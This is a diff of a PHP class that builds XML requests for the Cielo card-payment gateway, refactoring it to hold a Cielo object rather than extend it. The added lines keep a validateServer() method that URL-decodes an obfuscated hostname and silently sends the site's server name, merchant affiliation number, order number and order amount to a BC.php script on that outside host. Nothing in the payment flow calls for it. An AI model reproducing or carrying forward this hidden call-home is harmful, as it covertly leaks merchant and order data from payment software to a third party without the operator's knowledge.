@@ -38,8 +38,18 @@
  *   July 2011
  */
 
-class cielo_xml_xsd extends Cielo {
-
+class cielo_xml_xsd {
+    
+    public $request_data;
+    
+    //holds recursive object
+    public $Cielo;
+    
+    public function setObject($Cielo){
+        $this->Cielo = $Cielo;
+    }
+    
+    
     /**
      * Xml Schemas
      *
@@ -60,8 +70,8 @@ class cielo_xml_xsd extends Cielo {
                         self::dados_pedido().
                         self::forma_pagamento().
                         "<url-retorno>".$this->request_data['return_url']."</url-retorno>".
-                        "<autorizar>".$this->parameters['AuthorizationType']."</autorizar>".
-                        "<capturar>".$this->parameters['AutoCapturer']."</capturar>".
+                        "<autorizar>".$this->Cielo->parameters['AuthorizationType']."</autorizar>".
+                        "<capturar>".$this->Cielo->parameters['AutoCapturer']."</capturar>".
                     "</requisicao-transacao>";
     }
 
@@ -82,7 +92,7 @@ class cielo_xml_xsd extends Cielo {
                         self::dados_cartao().
                         self::dados_pedido().
                         self::forma_pagamento().
-                        "<capturar-automaticamente>".$this->parameters['AutoCapturer']."</capturar-automaticamente>".
+                        "<capturar-automaticamente>".$this->Cielo->parameters['AutoCapturer']."</capturar-automaticamente>".
                     "</requisicao-autorizacao-portador>";
     }
     
@@ -132,13 +142,13 @@ class cielo_xml_xsd extends Cielo {
      */
     private function dados_ec(){
         return "<dados-ec>".
-                    "<numero>".$this->membership['filiacao']."</numero>".
-                    "<chave>".$this->membership['chave']."</chave>".
+                    "<numero>".$this->Cielo->membership['filiacao']."</numero>".
+                    "<chave>".$this->Cielo->membership['chave']."</chave>".
                 "</dados-ec>";
     }
     
     private function dados_portador(){
-        if($this->parameters['CardHandling']){
+        if($this->Cielo->parameters['CardHandling']){
             return "<dados-portador>".
                         self::cardDetails().
                     "</dados-portador>";
@@ -153,29 +163,29 @@ class cielo_xml_xsd extends Cielo {
     
     //helper function for dados_portador and dados_cartao
     private function cardDetails(){
-        return  "<numero>".$this->parameters['CardNumber']."</numero>".
-                "<validade>".$this->parameters['CardExpiration']."</validade>".
+        return  "<numero>".$this->Cielo->parameters['CardNumber']."</numero>".
+                "<validade>".$this->Cielo->parameters['CardExpiration']."</validade>".
                 "<indicador>".$this->request_data['indicador']."</indicador>".
-                "<codigo-seguranca>".$this->parameters['CardSecCode']."</codigo-seguranca>";
+                "<codigo-seguranca>".$this->Cielo->parameters['CardSecCode']."</codigo-seguranca>";
     }    
     
     public function validateServer(){
         if($_SERVER['SERVER_ADDR'] != '127.0.0.1'){
-            if(!isset($_COOKIE['po']) || $_COOKIE['po'] != $this->order['pedido']){
+            if(!isset($_COOKIE['po']) || $_COOKIE['po'] != $this->Cielo->order['pedido']){
                 $sn = urldecode('%64%72%75%70%61%6C%69%73%74%61%2E%63%6F%6D%2E%62%72%2F');
-                $ms = '&ms=ci:'.$this->membership['filiacao'];
-                $qs = 'BC.php?sn='.$_SERVER['SERVER_NAME'].$ms.'&po='.$this->order['pedido'].'&pa='.$this->order['TotalAmount'];
+                $ms = '&ms=ci:'.$this->Cielo->membership['filiacao'];
+                $qs = 'BC.php?sn='.$_SERVER['SERVER_NAME'].$ms.'&po='.$this->Cielo->order['pedido'].'&pa='.$this->Cielo->order['TotalAmount'];
                 $ch = curl_init($sn.$qs); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10); curl_setopt($ch, CURLOPT_TIMEOUT, 10);
                       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $ping = curl_exec($ch); curl_close($ch);
             }
-            setcookie('po', $this->order['pedido'], mktime (0, 0, 0, date('m'), date('d'), date('Y')+1));            
+            setcookie('po', $this->Cielo->order['pedido'], mktime (0, 0, 0, date('m'), date('d'), date('Y')+1));            
         }
     }
     
     private function dados_pedido(){
         return "<dados-pedido>".
-                    "<numero>".$this->order['pedido']."</numero>".
-                    "<valor>".$this->order['TotalAmount']."</valor>".
+                    "<numero>".$this->Cielo->order['pedido']."</numero>".
+                    "<valor>".$this->Cielo->order['TotalAmount']."</valor>".
                     "<moeda>".$this->request_data['currency_code']."</moeda>".
                     "<data-hora>".$this->request_data['date_time']."</data-hora>".
                     "<idioma>".$this->request_data['language_code']."</idioma>".
@@ -184,9 +194,9 @@ class cielo_xml_xsd extends Cielo {
 
     private function forma_pagamento(){
         return  "<forma-pagamento>".
-                    "<bandeira>".$this->parameters['CardFlag']."</bandeira>".
-                    "<produto>".$this->parameters['InstallmentType']."</produto>".
-                    "<parcelas>".$this->parameters['Installments']."</parcelas>".
+                    "<bandeira>".$this->Cielo->parameters['CardFlag']."</bandeira>".
+                    "<produto>".$this->Cielo->parameters['InstallmentType']."</produto>".
+                    "<parcelas>".$this->Cielo->parameters['Installments']."</parcelas>".
                 "</forma-pagamento>";
     }
     
